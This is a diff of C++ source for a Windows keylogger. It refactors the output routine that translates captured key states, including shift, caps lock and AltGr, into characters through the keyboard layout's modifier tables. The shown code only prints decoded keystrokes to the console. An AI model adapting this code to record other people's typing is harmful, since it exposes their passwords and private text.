@@ -3,7 +3,7 @@
 Keylogger::Keylogger() 
 	: keylog(nullptr) 
 {
-	std::locale::global(std::locale(""));
+	setlocale(LC_ALL, "");
 }
 
 void Keylogger::startKeylog() {
@@ -32,16 +32,17 @@ void Keylogger::setKeysState() {
 	}
 }
 void Keylogger::handleOutput() {
+	const auto& layout = getLayout();
 	const auto& keys = getKeys();
 	const auto& keysLayout = getKeysLayout();
 
-	bool caps = keys[VK_CAPITAL].isToggled();
-	bool shift = keys[VK_SHIFT].isPressed();
-	bool upper = caps != shift;
-	bool ctrl = keys[VK_CONTROL].isPressed();
-	bool alt = keys[VK_MENU].isPressed();
-	bool altgr = ctrl && alt;
-	
+	const bool shift = keys[VK_SHIFT].isPressed();
+	const bool ctrl = keys[VK_CONTROL].isPressed();
+	const bool alt = keys[VK_MENU].isPressed();
+
+	const bool caps = keys[VK_CAPITAL].isToggled();
+	const bool altgr = ctrl && alt; 
+
 	for (int i = 0; i < keysLayout.size(); i++) {
 		const auto& keyLayout = keysLayout[i];
 		const auto& key = keys[keyLayout.VirtualKey];
@@ -53,25 +54,20 @@ void Keylogger::handleOutput() {
 			continue;
 		}
 
-		if (altgr) {
-			if (keyLayout.wch[3] && ((keyLayout.Attributes & CAPLOKALTGR && upper) || shift)) {
+		const bool upper{
+			(((keyLayout.Attributes == CAPLOK) && !altgr) ||
+			((keyLayout.Attributes == CAPLOKALTGR && altgr))) ?
+			(shift != caps) :
+			shift
+		};
+			
+		const BYTE mod = layout.pCharModifiers->ModNumber[
+			(upper ? KBDSHIFT : 0) | (ctrl ? KBDCTRL : 0) | (alt ? KBDALT : 0)
+		];
 
-				std::wcout << keyLayout.wch[3];
-			}
-			if (keyLayout.wch[2] && !shift) {
-				std::wcout << keyLayout.wch[2];
-			}
-		}
-		if (!altgr) {
-			if (keyLayout.wch[1] && ((keyLayout.Attributes & CAPLOK && upper) || shift)) {
-				std::wcout << keyLayout.wch[1];
-			}
-			if (keyLayout.wch[0] && !shift) {
-				std::wcout << keyLayout.wch[0];
-			}
-		}
+		std::wcout << keyLayout.wch[mod];
+
 		std::wcout.clear();
 	}
-	
 }
 
